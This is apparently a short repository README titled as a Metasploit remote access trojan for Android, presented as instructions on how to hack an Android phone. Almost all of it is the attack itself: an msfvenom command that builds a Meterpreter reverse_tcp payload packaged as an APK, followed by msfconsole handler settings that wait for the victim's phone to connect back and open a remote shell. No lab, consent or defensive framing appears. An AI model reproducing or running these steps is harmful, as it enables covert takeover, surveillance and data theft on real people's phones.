# kali_metasploit_rat_for_androd
Collected From Bd Grey Hat Hackers

How to hack android phone using Metasploit.
Commands - 
msfvenom -p android/meterpreter/reverse_tcp LHOST="Your Ip" LPORT+4444 R > main.apk
msfconsole
use multi/handler
set payload android/meterpreter/reverse_tcp
set lhost "your IP"
set lport 4444
exploit
